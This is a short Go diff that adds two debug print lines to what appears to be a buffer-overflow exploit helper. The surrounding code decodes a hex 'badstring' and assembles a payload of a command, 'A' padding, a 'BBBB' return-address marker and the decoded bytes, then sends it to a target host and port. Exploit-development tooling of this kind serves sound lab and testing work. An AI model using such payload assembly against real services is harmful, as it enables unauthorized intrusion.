@@ -143,7 +143,8 @@ OUTER:
 	}
 	decoded, _ := hex.DecodeString(badstring)
 	fmt.Println("Bytearray size:", len(decoded))
-
+	fmt.Println(badstring)
+	fmt.Println(decoded)
 	//Assemble and send payload
 	payload := fmt.Sprintf(c.Cmd + strings.Repeat("A", o) + "BBBB" + string(decoded))
 	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
